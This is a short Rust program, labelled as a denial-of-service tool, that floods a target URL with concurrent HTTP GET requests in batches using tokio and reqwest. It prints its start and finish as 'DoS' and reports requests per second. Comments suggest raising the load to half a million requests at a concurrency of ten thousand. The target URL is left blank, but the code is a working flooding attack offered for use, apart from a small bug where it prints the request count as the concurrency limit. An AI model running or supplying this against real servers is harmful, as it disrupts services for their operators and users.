#![allow(unused)]

use tokio;
use reqwest;
use std::time::Instant;
use futures::future::join_all;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("***** DoS Started *****\n");

    let url: &str = "https://";
    let num_requests: i32 = 3000;  // 500_000
    let concurrency_limit: usize = 1000; // 10_000 // Waves of high throughput

    println!("[+] URL target: {url}");
    println!("[+] Requests number: {num_requests}");
    println!("[+] Concurrency limit: {num_requests}\n");

    let client: reqwest::Client = reqwest::Client::new();
    
    println!("[+] Sending {} requests to '{}' \n", num_requests, url);

    let start: Instant = Instant::now();

    for chunk in (0..num_requests).collect::<Vec<_>>().chunks(concurrency_limit) {
        let requests = chunk.iter().map(|_| {
            let client: reqwest::Client = client.clone();
            let url: String = url.to_string();
            
            async move {
                match client
                .get(&url)
                .header(
                    "X-Sending-Requests", "RequestOverflow"
                )
                .send().await {
                    Ok(resp) => {
                        println!("[success] status: {}", resp.status());
                        resp.text().await.ok();
                    }
                    Err(e) => println!("[error] {}", e),
                }
            }
        });

        join_all(requests).await;
    }

    let duration: std::time::Duration = start.elapsed();

    println!("\n[+] Total Time: {:.2?} seconds", duration);
    println!("[+] Requests per second: {:.2}/s", num_requests as f64 / duration.as_secs_f64());

    println!("\n***** DoS Finished *****");

    Ok(())
}
